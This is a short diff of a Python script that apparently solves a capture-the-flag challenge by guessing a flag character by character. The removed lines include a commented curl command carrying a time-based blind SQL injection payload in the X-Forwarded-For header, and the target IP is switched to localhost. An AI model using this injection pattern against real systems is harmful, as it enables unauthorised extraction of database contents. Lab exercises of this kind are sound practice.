@@ -4,12 +4,7 @@ import requests
 import time
 import string
 
-# create character list A-Z 0-9 {} :
-# curl '10.10.26.93' -H "X-Forwarded-For: 127.0.0.1' AND (SELECT sleep(2) from flag where substr(flag.flag,1,1) = 'T') AND '1'='1"
-
-
-## FYI dictionary is just a string. in a "for" loop, it iterates through its characters by design, just remembered.
-ip = "10.10.3.152"
+ip = "127.0.0.1"
 dictionary = string.ascii_uppercase + string.digits + '{' + '}' + ':'
 
 def main():
